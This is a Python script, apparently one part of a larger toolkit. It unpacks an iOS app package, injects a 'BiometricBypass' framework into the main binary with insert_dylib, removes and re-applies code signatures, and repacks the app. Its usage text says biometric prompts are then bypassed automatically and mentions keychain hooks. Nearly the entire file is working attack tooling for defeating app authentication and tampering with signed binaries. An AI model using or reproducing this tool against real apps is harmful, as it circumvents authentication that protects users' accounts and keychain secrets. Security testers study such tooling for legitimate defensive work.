# instrumentor.py
# Enhanced IPA instrumentation engine with BiometricBypass framework injection

import os
import sys
import subprocess
import zipfile
import shutil
import plistlib
from pathlib import Path
import logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

class IPAInstrumentor:
    def __init__(self, ipa_path, output_path=None, framework_path=None):
        self.ipa_path = Path(ipa_path)
        self.output_path = Path(output_path) if output_path else self.ipa_path.parent / f"{self.ipa_path.stem}_instrumented.ipa"
        self.framework_path = Path(framework_path) if framework_path else Path("./build/BiometricBypass.framework")
        self.work_dir = Path("/tmp/ipa_instrumentation")
        self.app_bundle_path = None
        self.binary_path = None
        self.bundle_id = None
        
    def run_command(self, cmd, check=True):
        """Execute shell command and return output"""
        logger.info(f"Running: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check)
        if result.returncode != 0 and check:
            logger.error(f"Command failed: {result.stderr}")
            raise Exception(f"Command failed: {cmd}")
        return result.stdout.strip()
    
    def extract_ipa(self):
        """Extract IPA to working directory"""
        logger.info("Extracting IPA...")
        
        if self.work_dir.exists():
            shutil.rmtree(self.work_dir)
        self.work_dir.mkdir(parents=True)
        
        with zipfile.ZipFile(self.ipa_path, 'r') as zip_ref:
            zip_ref.extractall(self.work_dir)
        
        payload_dir = self.work_dir / "Payload"
        app_bundles = list(payload_dir.glob("*.app"))
        
        if not app_bundles:
            raise Exception("No .app bundle found in IPA")
        
        self.app_bundle_path = app_bundles[0]
        logger.info(f"Found app bundle: {self.app_bundle_path.name}")
        
    def find_binary(self):
        """Locate main executable binary"""
        logger.info("Locating main binary...")
        
        info_plist_path = self.app_bundle_path / "Info.plist"
        with open(info_plist_path, 'rb') as f:
            plist = plistlib.load(f)
        
        executable_name = plist.get('CFBundleExecutable')
        self.bundle_id = plist.get('CFBundleIdentifier')
        
        if not executable_name:
            raise Exception("Could not find CFBundleExecutable in Info.plist")
        
        self.binary_path = self.app_bundle_path / executable_name
        logger.info(f"Main binary: {executable_name}")
        logger.info(f"Bundle ID: {self.bundle_id}")
        
        if not self.binary_path.exists():
            raise Exception(f"Binary not found: {self.binary_path}")
        
    def analyze_binary(self):
        """Analyze binary architecture and structure"""
        logger.info("Analyzing binary structure...")
        
        arch_info = self.run_command(f"lipo -info '{self.binary_path}'")
        logger.info(f"Architectures: {arch_info}")
        
        load_commands = self.run_command(f"otool -L '{self.binary_path}'")
        logger.info("Existing library dependencies:")
        for line in load_commands.split('\n')[:10]:
            logger.info(f"  {line}")
        
        logger.info(f"Binary size: {self.binary_path.stat().st_size / 1024:.2f} KB")
        
    def inject_framework(self):
        """Inject BiometricBypass framework into binary"""
        logger.info("Injecting BiometricBypass framework...")
        
        if not self.framework_path.exists():
            raise Exception(f"Framework not found at {self.framework_path}. Run build_framework.sh first.")
        
        frameworks_dir = self.app_bundle_path / "Frameworks"
        frameworks_dir.mkdir(exist_ok=True)
        
        framework_dest = frameworks_dir / "BiometricBypass.framework"
        if framework_dest.exists():
            shutil.rmtree(framework_dest)
        
        shutil.copytree(self.framework_path, framework_dest)
        logger.info("Framework copied to app bundle")
        
        framework_load_path = "@executable_path/Frameworks/BiometricBypass.framework/BiometricBypass"
        
        try:
            self.run_command("which insert_dylib")
        except:
            logger.error("insert_dylib not found. Installing...")
            self.run_command("brew install insert_dylib")
        
        backup_path = f"{self.binary_path}.backup"
        shutil.copy2(self.binary_path, backup_path)
        
        try:
            result = self.run_command(
                f"insert_dylib --inplace --weak '{framework_load_path}' '{self.binary_path}'",
                check=False
            )
            
            if "Added LC_LOAD_WEAK_DYLIB" in result or "LC_LOAD_DYLIB" in result:
                logger.info("Successfully injected framework load command")
            else:
                logger.warning("insert_dylib output unclear, verifying...")
                
            verify = self.run_command(f"otool -L '{self.binary_path}' | grep BiometricBypass")
            if "BiometricBypass" in verify:
                logger.info("Verified: Framework load command present in binary")
            else:
                raise Exception("Framework injection verification failed")
                
        except Exception as e:
            logger.error(f"Error injecting framework: {e}")
            shutil.copy2(backup_path, self.binary_path)
            raise
        finally:
            if Path(backup_path).exists():
                Path(backup_path).unlink()
        
    def remove_code_signature(self):
        """Remove existing code signature from all binaries"""
        logger.info("Removing existing code signatures...")
        
        self.run_command(f"codesign --remove-signature '{self.binary_path}'", check=False)
        
        frameworks_dir = self.app_bundle_path / "Frameworks"
        if frameworks_dir.exists():
            for framework in frameworks_dir.glob("*.framework"):
                framework_binary = framework / framework.stem
                if framework_binary.exists():
                    self.run_command(f"codesign --remove-signature '{framework_binary}'", check=False)
        
        for dylib in self.app_bundle_path.rglob("*.dylib"):
            self.run_command(f"codesign --remove-signature '{dylib}'", check=False)
        
    def resign_app(self, identity=None):
        """Re-sign app bundle with specified identity"""
        logger.info("Re-signing app bundle...")
        
        if identity is None:
            identities = self.run_command("security find-identity -v -p codesigning", check=False)
            logger.info("Available signing identities:")
            for line in identities.split('\n')[:5]:
                logger.info(f"  {line}")
            
            identity = "-"
            logger.info("Using ad-hoc signing (no identity specified)")
        
        self.remove_code_signature()
        
        frameworks_dir = self.app_bundle_path / "Frameworks"
        if frameworks_dir.exists():
            for framework in frameworks_dir.glob("*.framework"):
                logger.info(f"Signing framework: {framework.name}")
                self.run_command(f"codesign -f -s '{identity}' '{framework}'")
        
        for dylib in self.app_bundle_path.rglob("*.dylib"):
            logger.info(f"Signing dylib: {dylib.name}")
            self.run_command(f"codesign -f -s '{identity}' '{dylib}'")
        
        logger.info(f"Signing app bundle with identity: {identity}")
        self.run_command(f"codesign -f -s '{identity}' --deep --preserve-metadata=entitlements '{self.app_bundle_path}'")
        
        verify_result = self.run_command(f"codesign -v '{self.app_bundle_path}'", check=False)
        if verify_result:
            logger.warning(f"Signature verification output: {verify_result}")
        else:
            logger.info("Signature verification: OK")
        
    def repack_ipa(self):
        """Repack instrumented app into new IPA"""
        logger.info("Repacking IPA...")
        
        if self.output_path.exists():
            self.output_path.unlink()
        
        with zipfile.ZipFile(self.output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(self.work_dir):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(self.work_dir)
                    zipf.write(file_path, arcname)
        
        size_mb = self.output_path.stat().st_size / (1024 * 1024)
        logger.info(f"Created instrumented IPA: {self.output_path.name}")
        logger.info(f"Size: {size_mb:.2f} MB")
        
    def cleanup(self):
        """Remove temporary files"""
        logger.info("Cleaning up temporary files...")
        if self.work_dir.exists():
            shutil.rmtree(self.work_dir)
        
    def instrument(self, cleanup=True, signing_identity=None):
        """Main instrumentation pipeline"""
        try:
            logger.info(f"Starting instrumentation of {self.ipa_path.name}")
            logger.info("=" * 60)
            
            self.extract_ipa()
            self.find_binary()
            self.analyze_binary()
            self.inject_framework()
            self.resign_app(signing_identity)
            self.repack_ipa()
            
            if cleanup:
                self.cleanup()
            
            logger.info("=" * 60)
            logger.info("✅ Instrumentation complete!")
            logger.info(f"Output: {self.output_path}")
            logger.info(f"Bundle ID: {self.bundle_id}")
            
            return self.output_path
            
        except Exception as e:
            logger.error(f"❌ Instrumentation failed: {str(e)}")
            import traceback
            traceback.print_exc()
            return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python instrumentor.py <path_to_ipa> [output_path] [signing_identity] [framework_path]")
        print("\nExample:")
        print("  python instrumentor.py MyApp.ipa")
        print("  python instrumentor.py MyApp.ipa MyApp_instrumented.ipa")
        print("  python instrumentor.py MyApp.ipa MyApp_instrumented.ipa 'iPhone Developer'")
        sys.exit(1)
    
    ipa_path = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) > 2 else None
    signing_identity = sys.argv[3] if len(sys.argv) > 3 else None
    framework_path = sys.argv[4] if len(sys.argv) > 4 else None
    
    instrumentor = IPAInstrumentor(ipa_path, output_path, framework_path)
    result = instrumentor.instrument(cleanup=True, signing_identity=signing_identity)
    
    if result:
        print(f"\n✅ Success! Instrumented IPA: {result}")
        print("\nNext steps:")
        print("1. Install on device: ideviceinstaller -i <ipa_path>")
        print("2. Launch app and biometric prompts will be bypassed automatically")
        print("3. Check device logs: idevicesyslog | grep 'BiometricHook\\|KeychainHook'")
    else:
        print("\n❌ Instrumentation failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
